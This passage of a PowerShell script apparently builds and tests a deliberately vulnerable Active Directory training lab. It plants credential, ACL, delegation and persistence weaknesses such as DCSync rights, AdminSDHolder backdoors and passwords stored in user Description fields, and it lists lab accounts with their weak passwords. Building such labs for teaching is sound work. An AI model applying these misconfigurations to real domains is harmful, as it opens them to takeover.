        @{Id="C5"; Name="Credentials in AD Attributes"; Desc="Stores plaintext passwords in Description/Info fields."}
        @{Id="C6"; Name="NTLMv2 Hash Capture (UNC Trigger)"; Desc="Plants a desktop.ini UNC path trigger in an open share."}
    )
    ACL = @(
        @{Id="A1"; Name="WriteDACL on Domain Object"; Desc="Grants a low-priv user WriteDACL on the domain root."}
        @{Id="A2"; Name="GenericAll on User"; Desc="Full control over a target user account."}
        @{Id="A3"; Name="GenericWrite on User"; Desc="Modify non-protected attributes  -  SPN Kerberoasting path."}
        @{Id="A4"; Name="ForceChangePassword"; Desc="Extended right to reset passwords on multiple accounts."}
        @{Id="A5"; Name="AddMember to Privileged Group"; Desc="WriteProperty on IT-Admins member attribute."}
    )
    Delegation = @(
        @{Id="D1"; Name="Unconstrained Delegation"; Desc="Enables unconstrained delegation on a computer and service account."}
        @{Id="D2"; Name="Constrained Delegation (S4U)"; Desc="Protocol transition delegation to CIFS on the DC."}
        @{Id="D3"; Name="RBCD  -  Resource-Based Constrained Delegation"; Desc="GenericWrite on computer object enabling RBCD abuse."}
    )
    Lateral = @(
        @{Id="L1"; Name="Pass-the-Hash"; Desc="Creates local admin with known hash; disables PTH mitigations."}
        @{Id="L2"; Name="Overpass-the-Hash / Pass-the-Key"; Desc="Allows RC4 Kerberos and TGT session key export."}
        @{Id="L3"; Name="Pass-the-Ticket"; Desc="Extends ticket lifetime for TGS extraction practice."}
    )
    Persistence = @(
        @{Id="P1"; Name="AdminSDHolder Backdoor"; Desc="Adds ACE to AdminSDHolder for persistent privileged access."}
        @{Id="P2"; Name="DCSync Rights"; Desc="Grants replication rights to a low-priv user."}
        @{Id="P3"; Name="Shadow Credentials"; Desc="WriteProperty on msDS-KeyCredentialLink for certificate-based auth abuse."}
        @{Id="P4"; Name="Golden Ticket Prerequisites"; Desc="Full chain: DCSync + krbtgt hash for Golden Ticket forgery."}
    )
}

function Deploy-AllLabs {
    <#
    .SYNOPSIS Deploy every lab in the catalog in one shot.
    .NOTES    Designed for instructor / intern handoff scenarios where you want a
              fully populated attack surface waiting before students log in.
              Idempotent: skips any lab already in $ADPState.ActiveLabs.
    #>
    if (-not (Assert-Baseline)) { return }

    Write-Banner
    Write-SectionHeader "Deploy ALL Labs (31 total)"
    Write-Color "  This will deploy every lab in the catalog at once." DarkGray
    Write-Color "  Some labs (E9 IIS feature install, L3 GPO modification)" DarkGray
    Write-Color "  take 30-90s each. Total estimated time: 5-10 minutes." DarkGray
    Write-Host ""
    Write-Color "  Already-deployed labs are skipped (idempotent)." Yellow
    Write-Host ""
    $confirm = Get-MenuChoice "Type YES to confirm"
    if ($confirm -ne "YES") {
        Write-Status "Cancelled." WARN
        Pause-Menu
        return
    }

    $allLabs = @(
        "E1","E2","E3","E4","E5","E6","E7","E8","E9","E10",
        "C1","C2","C3","C4","C5","C6",
        "A1","A2","A3","A4","A5",
        "D1","D2","D3",
        "L1","L2","L3",
        "P1","P2","P3","P4"
    )

    $start    = Get-Date
    $deployed = 0; $skipped = 0; $failed = 0
    $idx      = 0

    foreach ($lab in $allLabs) {
        $idx++
        Write-Host ""
        Write-Color ("  --- [{0,2}/31] {1} " -f $idx, $lab) DarkCyan -NoNewline
        Write-Color ("-" * (52 - $lab.Length)) DarkCyan

        # Skip if already active (by prefix match against ActiveLabs entries)
        $alreadyActive = $Global:ADPState.ActiveLabs | Where-Object { $_ -like "$lab-*" }
        if ($alreadyActive) {
            Write-Status "Already deployed -- skipping" INFO
            $skipped++
            continue
        }

        try {
            & $Global:LabDeployMap[$lab]
            $deployed++
        } catch {
            Write-Status "FAILED: $_" FAIL
            $failed++
        }
        Start-Sleep -Milliseconds 200
    }

    $elapsed = (Get-Date) - $start
    Write-Host ""
    Write-Color "  +------------------------------------------------------+" Green
    Write-Color "  |  Deploy-All Complete                                 |" Green
    Write-Color ("  |  Deployed: {0,2}   Skipped: {1,2}   Failed: {2,2}   Time: {3:mm\:ss}   |" -f $deployed, $skipped, $failed, $elapsed) Green
    Write-Color "  +------------------------------------------------------+" Green
    Write-Host ""
    Write-Status "Run [6] Self-Test Suite to verify all labs are operational." INFO
    Write-Status "Teardown all labs via Main Menu [5] -> [2] Teardown all active labs." INFO
    Pause-Menu
}

function Show-LabsMenu {
    while ($true) {
        Write-Banner
        Write-SectionHeader "Labs"
        Write-MenuItem "1" "Enumeration         (10 labs)" Cyan
        Write-MenuItem "2" "Credential Attacks  ( 6 labs)" Red
        Write-MenuItem "3" "ACL Abuse           ( 5 labs)" Yellow
        Write-MenuItem "4" "Delegation          ( 3 labs)" Green
        Write-MenuItem "5" "Lateral Movement    ( 3 labs)" DarkYellow
        Write-MenuItem "6" "Persistence         ( 4 labs)" Magenta
        Write-Host ""
        Write-MenuItem "A" "Deploy ALL labs (31)" Green
        Write-Host ""
        Write-MenuItem "B" "Back" DarkGray

        $choice = Get-MenuChoice "Category"
        switch ($choice) {
            "1" { Show-LabSubMenu -Category "Enumeration"        -Labs $Global:LabCatalog.Enumeration }
            "2" { Show-LabSubMenu -Category "Credential Attacks" -Labs $Global:LabCatalog.Credential }
            "3" { Show-LabSubMenu -Category "ACL Abuse"          -Labs $Global:LabCatalog.ACL }
            "4" { Show-LabSubMenu -Category "Delegation"         -Labs $Global:LabCatalog.Delegation }
            "5" { Show-LabSubMenu -Category "Lateral Movement"   -Labs $Global:LabCatalog.Lateral }
            "6" { Show-LabSubMenu -Category "Persistence"        -Labs $Global:LabCatalog.Persistence }
            { $_ -in "A","a" } { Deploy-AllLabs }
            { $_ -in "B","b" } { return }
        }
    }
}

function Show-ScenariosMenu {
    while ($true) {
        Write-Banner
        Write-SectionHeader "Scenarios"

        $diffColors = @{1="Green";2="Yellow";3="Red";4="Red";5="Yellow";6="Red";7="Cyan"}
        foreach ($key in ($Global:Scenarios.Keys | Sort-Object)) {
            $s    = $Global:Scenarios[$key]
            $col  = $diffColors[$key]
            Write-Color "    [" DarkGray -NoNewline
            Write-Color "$key" $col -NoNewline
            Write-Color "] " DarkGray -NoNewline
            Write-Color $s.Name White
            Write-Color "        $($s.Description)" DarkGray
            Write-Host ""
        }
        Write-MenuItem "B" "Back" Magenta

        $choice = Get-MenuChoice "Select scenario"
        if ($choice -eq "B" -or $choice -eq "b") { return }

        $id = [int]$choice
        if ($Global:Scenarios.ContainsKey($id)) {
            $s = $Global:Scenarios[$id]
            Write-Banner
            Write-SectionHeader $s.Name
            Write-Color "  $($s.Description)" DarkGray
            Write-Host ""
            if ($id -ne 7) {
                Write-Color "  Attack Chain: " Yellow -NoNewline
                Write-Color ($s.Chain -join " → ") Cyan
            }
            Write-Host ""
            Write-MenuItem "1" "Deploy Scenario"   Green
            Write-MenuItem "2" "Teardown Scenario" Red
            Write-MenuItem "B" "Back"              Magenta

            $action = Get-MenuChoice "Action"
            switch ($action) {
                "1" { Invoke-Scenario  -Id $id }
                "2" { Teardown-Scenario -Id $id }
                { $_ -in "B","b" } { }
            }
        }
    }
}

function Show-StatusMenu {
    Write-Banner
    Write-SectionHeader "Active Lab Status"

    if ($Global:ADPState.BaselineReady) {
        Write-Color "  Baseline: " DarkGray -NoNewline; Write-Color "Ready" Green
        try {
            $dom = Get-ADDomain
            Write-Color "  Domain  : " DarkGray -NoNewline; Write-Color $dom.DNSRoot Cyan
            Write-Color "  DN      : " DarkGray -NoNewline; Write-Color $dom.DistinguishedName DarkGray
        } catch {}
    } else {
        Write-Color "  Baseline: " DarkGray -NoNewline; Write-Color "Not configured" Red
    }

    Write-Host ""
    Write-Color "  Active Labs ($($Global:ADPState.ActiveLabs.Count)):" Yellow
    Show-ActiveLabs
    Pause-Menu
}

function Show-TeardownMenu {
    while ($true) {
        Write-Banner
        Write-SectionHeader "Teardown / Clean"
        Write-MenuItem "1" "Teardown a specific lab" Red
        Write-MenuItem "2" "Teardown all active labs" Red
        Write-MenuItem "3" "Teardown a scenario"     Yellow
        Write-MenuItem "B" "Back"                    Magenta

        $choice = Get-MenuChoice "Action"
        switch ($choice) {
            "1" {
                Write-Host ""
                Write-Color "  Active labs: " Yellow
                Show-ActiveLabs
                Write-Host ""
                $labId = Get-MenuChoice "Enter Lab ID to teardown (e.g. C1, A2)"
                $labId = $labId.Trim().ToUpper()
                if ($Global:LabTeardownMap.ContainsKey($labId)) {
                    Write-Host ""
                    & $Global:LabTeardownMap[$labId]
                } else {
                    Write-Status "Unknown lab ID: $labId" WARN
                }
                Pause-Menu
            }
            "2" {
                Write-Host ""
                $active = [array]$Global:ADPState.ActiveLabs
                if ($active.Count -eq 0) {
                    Write-Status "No active labs." INFO
                } else {
                    foreach ($labId in $active) {
                        # Extract lab key: sort by descending length so E10 matches before E1
                        $labKey = $Global:LabTeardownMap.Keys |
                            Sort-Object { $_.Length } -Descending |
                            Where-Object { $labId.StartsWith($_) } |
                            Select-Object -First 1
                        if (-not $labKey) { $labKey = ($labId -split '-')[0] }   # fallback

                        if ($Global:LabTeardownMap.ContainsKey($labKey)) {
                            Write-Color "  Cleaning $labId..." DarkCyan
                            & $Global:LabTeardownMap[$labKey]
                        } else {
                            Write-Status "No teardown found for $labId - skipping." WARN
                        }
                    }
                    Write-Status "All active labs cleaned." OK
                }
                Pause-Menu
            }
            "3" {
                Write-Host ""
                foreach ($key in ($Global:Scenarios.Keys | Sort-Object)) {
                    Write-Color "    [$key] $($Global:Scenarios[$key].Name)" White
                }
                $sid = [int](Get-MenuChoice "Scenario number")
                if ($Global:Scenarios.ContainsKey($sid)) {
                    Teardown-Scenario -Id $sid
                }
            }
            { $_ -in "B","b" } { return }
        }
    }
}

# ─────────────────────────────────────────────────────────────────────────────
#  SELF-TEST SUITE
#  Validates that each active lab is actually deployed and attack-ready.
#  Each test checks AD state on the DC - no external tools required.
# ─────────────────────────────────────────────────────────────────────────────

function Test-Pass { param([string]$Msg); Write-Color "    [PASS] " Green -NoNewline; Write-Color $Msg White }
function Test-Fail { param([string]$Msg); Write-Color "    [FAIL] " Red   -NoNewline; Write-Color $Msg White }
function Test-Skip { param([string]$Msg); Write-Color "    [SKIP] " DarkGray -NoNewline; Write-Color $Msg DarkGray }
function Test-Info { param([string]$Msg); Write-Color "    [INFO] " Cyan  -NoNewline; Write-Color $Msg DarkGray }

function Invoke-SelfTest {
    if (-not (Assert-Baseline)) { return }

    Write-Banner
    Write-SectionHeader "Self-Test  -  Lab Validation Suite"
    Write-Color "  Checks every active lab against the live AD state." DarkGray
    Write-Host ""

    # Counters at script scope so the nested Run-Check function can increment them
    $script:_stPass = 0; $script:_stFail = 0; $script:_stSkip = 0

    # ── Helper: run a check and score it ─────────────────────────────────────
    function Run-Check {
        param([string]$LabId, [string]$Desc, [scriptblock]$Check)
        $active = $Global:ADPState.ActiveLabs | Where-Object { $_ -like "$LabId*" }
        if (-not $active) { $script:_stSkip++; Test-Skip "$LabId  -  $Desc  (not deployed)"; return }
        try {
            $ok = & $Check
            if ($ok) { $script:_stPass++; Test-Pass "$LabId  -  $Desc" }
            else      { $script:_stFail++; Test-Fail "$LabId  -  $Desc" }
        } catch {
            $script:_stFail++; Test-Fail "$LabId  -  $Desc  (exception: $_)"
        }
    }

    $dn = Get-DomainDN

    # ── ENUMERATION ───────────────────────────────────────────────────────────
    Write-Color "  Enumeration Labs" Yellow
    Write-Host ""

    Run-Check "E1" "jdoe_legacy has password in Description" {
        $u = Get-ADUser "jdoe_legacy" -Properties Description
        $u.Description -and $u.Description -match "Welcome1|Temp pwd|pwd"
    }
    Run-Check "E2" "IT_Share SMB share exists" {
        $null -ne (Get-SmbShare -Name "IT_Share" -ErrorAction SilentlyContinue)
    }
    Run-Check "E3" "svc_sql and svc_web have SPNs set" {
        $sql = (Get-ADUser "svc_sql" -Properties ServicePrincipalName).ServicePrincipalName
        $web = (Get-ADUser "svc_web" -Properties ServicePrincipalName).ServicePrincipalName
        ($sql.Count -gt 0) -and ($web.Count -gt 0)
    }
    Run-Check "E4" "Help-Desk has GenericAll ACE on analyst01" {
        $acl = Get-Acl "AD:\$((Get-ADUser analyst01).DistinguishedName)"
        $acl.Access | Where-Object { $_.IdentityReference -match "Help-Desk" -and $_.ActiveDirectoryRights -match "GenericAll" }
    }
    Run-Check "E5" "jdoe_legacy DoesNotRequirePreAuth = true" {
        (Get-ADUser "jdoe_legacy" -Properties DoesNotRequirePreAuth).DoesNotRequirePreAuth
    }
    Run-Check "E6" "DNS zone allows zone transfer from any server" {
        $zone = Get-DnsServerZone -Name $Global:ADPConfig.Domain -ErrorAction SilentlyContinue
        $zone -and $zone.SecureSecondaries -eq "TransferAnyServer"
    }
    Run-Check "E7" "RestrictAnonymous = 0 (RPC null sessions open)" {
        $v = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name RestrictAnonymous -EA SilentlyContinue).RestrictAnonymous
        $v -eq 0
    }
    Run-Check "E8" "GPP Groups.xml planted in SYSVOL" {
        $p = "C:\Windows\SYSVOL\sysvol\$($Global:ADPConfig.Domain)\Policies\{ADP00001-0000-0000-0000-000000000001}\Machine\Preferences\Groups\Groups.xml"
        Test-Path $p
    }
    Run-Check "E9" "IIS (W3SVC) is running and listening on port 80" {
        $svc = Get-Service W3SVC -ErrorAction SilentlyContinue
        $svc -and $svc.Status -eq "Running" -and
        ($null -ne (Get-NetTCPConnection -LocalPort 80 -State Listen -ErrorAction SilentlyContinue))
    }
    Run-Check "E9" "IIS /staff/ directory exists with users.txt (>= 10 entries)" {
        $f = "C:\inetpub\wwwroot\staff\users.txt"
        (Test-Path $f) -and ((Get-Content $f | Measure-Object -Line).Lines -ge 10)
    }
    Run-Check "E9" "Directory browsing enabled in /staff/web.config" {
        $wc = "C:\inetpub\wwwroot\staff\web.config"
        (Test-Path $wc) -and ((Get-Content $wc -Raw) -match 'directoryBrowse enabled="true"')
    }
    Run-Check "E10" "jdoe_legacy Description contains trust/SIDHistory reference" {
        $u = Get-ADUser "jdoe_legacy" -Properties Description
        $u.Description -and $u.Description -match "trust|SID"
    }

    Write-Host ""

    # ── CREDENTIAL ATTACKS ────────────────────────────────────────────────────
    Write-Color "  Credential Attack Labs" Yellow
    Write-Host ""

    Run-Check "C1" "At least one account has DoesNotRequirePreAuth = true" {
        (Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}).Count -gt 0
    }
    Run-Check "C2" "svc_sql has at least one SPN set (Kerberoastable)" {
        (Get-ADUser "svc_sql" -Properties ServicePrincipalName).ServicePrincipalName.Count -gt 0
    }
    Run-Check "C3" "Spray target jdoe_legacy has password Welcome1 (test auth)" {
        # Non-destructive check: just verify the account is enabled and unlocked
        $u = Get-ADUser "jdoe_legacy" -Properties Enabled,LockedOut
        $u.Enabled -and -not $u.LockedOut
    }
    Run-Check "C4" "LLMNR EnableMulticast = 1" {
        $v = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast -EA SilentlyContinue).EnableMulticast
        $v -eq 1
    }
    Run-Check "C5" "svc_backup has password in Description" {
        $u = Get-ADUser "svc_backup" -Properties Description
        $u.Description -and $u.Description -match "Monkey1|Pwd:|pwd"
    }
    Run-Check "C6" "LabTrigger share exists with desktop.ini" {
        (Get-SmbShare -Name "LabTrigger" -EA SilentlyContinue) -and (Test-Path "C:\ADPLab_NTLMTrigger\desktop.ini")
    }

    Write-Host ""

    # ── ACL ABUSE ─────────────────────────────────────────────────────────────
    Write-Color "  ACL Abuse Labs" Yellow
    Write-Host ""

    Run-Check "A1" "helpdesk01 has WriteDACL ACE on domain object" {
        $acl = Get-Acl "AD:\$dn"
        $acl.Access | Where-Object { $_.IdentityReference -match "helpdesk01" -and $_.ActiveDirectoryRights -match "WriteDacl" }
    }
    Run-Check "A2" "helpdesk01 has GenericAll ACE on dbadmin" {
        $acl = Get-Acl "AD:\$((Get-ADUser dbadmin).DistinguishedName)"
        $acl.Access | Where-Object { $_.IdentityReference -match "helpdesk01" -and $_.ActiveDirectoryRights -match "GenericAll" }
    }
    Run-Check "A3" "analyst01 has GenericWrite ACE on svc_sql" {
        $acl = Get-Acl "AD:\$((Get-ADUser svc_sql).DistinguishedName)"
        $acl.Access | Where-Object { $_.IdentityReference -match "analyst01" -and $_.ActiveDirectoryRights -match "GenericWrite" }
    }
    Run-Check "A4" "helpdesk01 has ForceChangePassword (ExtendedRight) on analyst01" {
        $acl = Get-Acl "AD:\$((Get-ADUser analyst01).DistinguishedName)"
        $acl.Access | Where-Object { $_.IdentityReference -match "helpdesk01" -and $_.ActiveDirectoryRights -match "ExtendedRight" }
    }
    Run-Check "A5" "analyst01 has WriteProperty (member) ACE on IT-Admins" {
        $acl = Get-Acl "AD:\$((Get-ADGroup 'IT-Admins').DistinguishedName)"
        $acl.Access | Where-Object { $_.IdentityReference -match "analyst01" -and $_.ActiveDirectoryRights -match "WriteProperty" }
    }

    Write-Host ""

    # ── DELEGATION ────────────────────────────────────────────────────────────
    Write-Color "  Delegation Labs" Yellow
    Write-Host ""

    Run-Check "D1" "svc_web TrustedForDelegation = true" {
        (Get-ADUser "svc_web" -Properties TrustedForDelegation).TrustedForDelegation
    }
    Run-Check "D2" "svc_sql has TrustedToAuthForDelegation + msDS-AllowedToDelegateTo set" {
        $u = Get-ADUser "svc_sql" -Properties TrustedToAuthForDelegation,"msDS-AllowedToDelegateTo"
        $u.TrustedToAuthForDelegation -and $u."msDS-AllowedToDelegateTo".Count -gt 0
    }
    Run-Check "D3" "analyst01 has GenericWrite ACE on the DC computer object" {
        $acl = Get-Acl "AD:\$((Get-ADComputer $env:COMPUTERNAME).DistinguishedName)"
        $acl.Access | Where-Object { $_.IdentityReference -match "analyst01" -and $_.ActiveDirectoryRights -match "GenericWrite" }
    }

    Write-Host ""

    # ── LATERAL MOVEMENT ──────────────────────────────────────────────────────
    Write-Color "  Lateral Movement Labs" Yellow
    Write-Host ""

    Run-Check "L1" "lab_localadmin domain account exists" {
        $null -ne (Get-ADUser "lab_localadmin" -ErrorAction SilentlyContinue)
    }
    Run-Check "L2" "svc_sql KerberosEncryptionType includes RC4" {
        # ADPropertyValueCollection cannot be cast to int; check string representation instead
        $enc = (Get-ADUser "svc_sql" -Properties KerberosEncryptionType).KerberosEncryptionType
        "$enc" -match "RC4"
    }
    Run-Check "L3" "svc_sql exists and has an active SPN for ticket extraction" {
        (Get-ADUser "svc_sql" -Properties ServicePrincipalName).ServicePrincipalName.Count -gt 0
    }

    Write-Host ""

    # ── PERSISTENCE ───────────────────────────────────────────────────────────
    Write-Color "  Persistence Labs" Yellow
    Write-Host ""

    Run-Check "P1" "analyst01 has GenericAll ACE on AdminSDHolder" {
        $sdh = "CN=AdminSDHolder,CN=System,$dn"
        $acl = Get-Acl "AD:\$sdh"
        $acl.Access | Where-Object { $_.IdentityReference -match "analyst01" -and $_.ActiveDirectoryRights -match "GenericAll" }
    }
    Run-Check "P2" "analyst01 has DCSync ExtendedRight (Replicating Directory Changes)" {
        $acl = Get-Acl "AD:\$dn"
        $acl.Access | Where-Object {
            $_.IdentityReference -match "analyst01" -and
            $_.ActiveDirectoryRights -match "ExtendedRight" -and
            $_.ObjectType -eq [guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
        }
    }
    Run-Check "P3" "helpdesk01 has WriteProperty (msDS-KeyCredentialLink) on dbadmin" {
        $acl = Get-Acl "AD:\$((Get-ADUser dbadmin).DistinguishedName)"
        $acl.Access | Where-Object { $_.IdentityReference -match "helpdesk01" -and $_.ActiveDirectoryRights -match "WriteProperty" }
    }
    Run-Check "P4" "P2 DCSync rights present (P4 prereq)" {
        $acl = Get-Acl "AD:\$dn"
        $acl.Access | Where-Object { $_.IdentityReference -match "analyst01" -and $_.ActiveDirectoryRights -match "ExtendedRight" }
    }

    Write-Host ""

    # ── CRACKABILITY SPOT-CHECK ───────────────────────────────────────────────
    Write-Color "  Password / Crackability Checks  (LIVE Kerberos AS-REQ verification)" Yellow
    Write-Host ""

    # Verify the weak passwords are actually applied by attempting a Kerberos pre-auth.
    # This catches the "empty NT hash" bug where complexity policy silently drops the
    # password during account creation.
    function Test-KerberosPwd {
        param([string]$User, [string]$Pwd)
        try {
            Add-Type -AssemblyName System.DirectoryServices.AccountManagement
            $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
                [System.DirectoryServices.AccountManagement.ContextType]::Domain,
                $Global:ADPConfig.Domain)
            return $ctx.ValidateCredentials($User, $Pwd)
        } catch { return $false }
    }

    $pwdMap = [ordered]@{
        "jdoe_legacy"     = "Welcome1"
        "helpdesk01"      = "Password1"
        "analyst01"       = "Password1"
        "svc_sql"         = "dragon"
        "svc_web"         = "sunshine"
        "svc_scan"        = "iloveyou"
        "svc_backup"      = "Monkey1"
        "svc_legacy"      = "abc123"
        "itadmin"         = "letmein"
        "dbadmin"         = "trustno1"
        "lab_localadmin"  = "football"
    }
    $emptyHashCount = 0
    foreach ($entry in $pwdMap.GetEnumerator()) {
        $user = $entry.Key; $pwd = $entry.Value
        if (-not (Get-ADUser -Identity $user -EA SilentlyContinue)) { continue }
        $ok = Test-KerberosPwd -User $user -Pwd $pwd
        if ($ok) {
            Test-Pass "PWD: $user → '$pwd' (Kerberos auth succeeded)"
            $script:_stPass++
        } else {
            Test-Fail "PWD: $user → '$pwd' (auth failed - account has wrong/empty password)"
            $script:_stFail++
            $emptyHashCount++
        }
    }
    if ($emptyHashCount -gt 0) {
        Write-Host ""
        Test-Info "WARNING: $emptyHashCount account(s) have wrong passwords (likely created"
        Test-Info "         before complexity-policy fix). Run [7] Repair Passwords to fix."
    }

    Write-Host ""

    # ── SUMMARY ───────────────────────────────────────────────────────────────
    Write-Color "  ┌────────────────────────────────────────────────┐" DarkCyan
    Write-Color "  │  Results: " DarkCyan -NoNewline
    Write-Color "$($script:_stPass) PASS  " Green -NoNewline
    Write-Color "$($script:_stFail) FAIL  " Red -NoNewline
    Write-Color "$($script:_stSkip) SKIP" DarkGray -NoNewline
    Write-Color "             │" DarkCyan
    Write-Color "  └────────────────────────────────────────────────┘" DarkCyan

    if ($script:_stFail -gt 0) {
        Write-Host ""
        Write-Status "$($script:_stFail) check(s) failed. Deploy the relevant lab or re-run after deploying." WARN
    }
    Pause-Menu
}

# ─────────────────────────────────────────────────────────────────────────────
#  MAIN MENU
# ─────────────────────────────────────────────────────────────────────────────
function Show-MainMenu {
    while ($true) {
        Write-Banner
        $baseStatus = if ($Global:ADPState.BaselineReady) { "[READY]" } else { "[NOT CONFIGURED]" }
        $baseColor  = if ($Global:ADPState.BaselineReady) { "Green"   } else { "Red" }
        $activeCnt  = $Global:ADPState.ActiveLabs.Count

        Write-Color "  Baseline: " DarkGray -NoNewline
        Write-Color $baseStatus $baseColor -NoNewline
        Write-Color "    Active Labs: " DarkGray -NoNewline
        Write-Color "$activeCnt" Yellow
        Write-Host ""

        Write-MenuItem "1" "Setup Baseline  (Install AD DS + Populate Users)" Cyan
        Write-Host ""
        Write-MenuItem "2" "Labs            (31 individual technique labs)"    Yellow
        Write-MenuItem "3" "Scenarios       (7 chained attack scenarios)"      Green
        Write-Host ""
        Write-MenuItem "4" "Active Lab Status"  DarkCyan
        Write-MenuItem "5" "Teardown / Clean"   Red
        Write-MenuItem "6" "Self-Test Suite"      Green
        Write-MenuItem "7" "Repair Passwords"     Yellow
        Write-Host ""
        Write-MenuItem "8" "Exit"                 DarkGray
        Write-Host ""

        $choice = Get-MenuChoice "Select"
        switch ($choice) {
            "1" { Invoke-BaselineSetup }
            "2" { Show-LabsMenu }
            "3" { Show-ScenariosMenu }
            "4" { Show-StatusMenu }
            "5" { Show-TeardownMenu }
            "6" { Invoke-SelfTest }
            "7" {
                Write-Banner
                Write-SectionHeader "Repair: Re-apply Weak Passwords"
                Write-Color "  Resets all lab account passwords to their intended weak rockyou.txt values." DarkGray
                Write-Color "  Use this if you deployed a baseline with the original (broken) script." DarkGray
                Write-Host ""
                if (-not (Assert-Baseline)) { continue }
                Repair-WeakPasswords
                Pause-Menu
            }
            "8" {
                Write-Host ""
                Write-Color "  Stay sharp. Good hunting." DarkGray
                Write-Host ""
                exit 0
            }
        }
    }
}

# ─────────────────────────────────────────────────────────────────────────────
#  ENTRY POINT
#  Set $Global:ADP_LibraryMode = $true before dot-sourcing this script to load
#  all functions without launching the interactive menu (used by test harnesses).
# ─────────────────────────────────────────────────────────────────────────────
if (-not $Global:ADP_LibraryMode) {
    Load-State
    try {
        if ($Global:ADPState.BaselineReady) {
            $dom = Get-ADDomain -ErrorAction SilentlyContinue
            if ($dom) {
                $Global:ADPConfig.Domain   = $dom.DNSRoot
                $Global:ADPConfig.DomainDN = $dom.DistinguishedName
            }
        }
    } catch {}
    Show-MainMenu
}
